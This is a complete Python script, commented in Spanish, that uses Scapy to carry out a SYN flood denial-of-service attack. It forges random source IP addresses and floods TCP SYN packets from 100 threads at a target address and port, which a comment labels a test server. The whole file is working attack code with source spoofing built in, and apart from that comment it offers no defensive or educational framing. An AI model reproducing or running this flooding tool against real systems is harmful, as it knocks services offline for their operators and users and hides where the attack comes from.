from scapy.all import *
import threading
import random
import time

def random_ip():
    """Genera una dirección IP aleatoria."""
    return ".".join(map(str, (random.randint(1, 254) for _ in range(4))))

def send_syn_flood(ip, port):
    """Envía paquetes SYN con IPs de origen falsificadas."""
    try:
        while True:
            spoofed_ip = random_ip()
            # Crear el paquete SYN con IP de origen falsificada
            syn_packet = IP(src=spoofed_ip, dst=ip) / TCP(dport=port, flags='S')
            send(syn_packet, verbose=False)
            print(f"Paquete SYN enviado desde {spoofed_ip} hacia {ip}:{port}")
            time.sleep(0.01)  # Pausa muy breve entre envíos para evitar sobrecargar el script
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    target_ip = "10.0.0.1"  # IP del servidor de prueba
    target_port = 80        # Puerto del servidor de prueba

    # Crear múltiples hilos para simular un ataque distribuido
    for i in range(100):  # Ajusta el número de hilos según sea necesario
        thread = threading.Thread(target=send_syn_flood, args=(target_ip, target_port))
        thread.start()
        time.sleep(0.1)  # Retraso breve para escalonar la creación de hilos
